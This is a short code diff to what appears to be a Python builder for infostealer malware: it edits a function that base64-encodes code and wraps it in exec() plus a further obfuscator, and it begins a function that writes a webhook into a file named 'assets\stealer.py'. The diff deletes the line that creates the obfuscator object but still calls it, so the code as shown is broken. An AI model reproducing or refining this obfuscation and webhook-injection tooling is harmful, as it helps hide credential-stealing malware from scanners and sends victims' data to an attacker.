@@ -28,16 +28,17 @@ def extract_imports_from_code(pycode):
     imports = import_pattern.findall(pycode)
     return '\n'.join([line for line in pycode.splitlines() if import_pattern.match(line)])
 
-
 def obfuscate_code(code):
-    obfuscator = python_obfuscator.obfuscator()
     c = extract_imports_from_code(code)
     encoded_code = list(base64.b64encode(code.encode('utf-8')))
     obfuscated_code = f"""
+import base64
 
-exec(base64.b64decode(bytes({encoded_code)))
+{c}
+
+exec(base64.b64decode(bytes({encoded_code})))
 """
-    return c + "\nimport base64\m" + obfuscator.obfuscate(obfuscated_code)
+    return c + "\nimport base64\n" + obfuscator.obfuscate(obfuscated_code)
 
 def replace_webhook(webhook):
     file_path = r'assets\stealer.py'
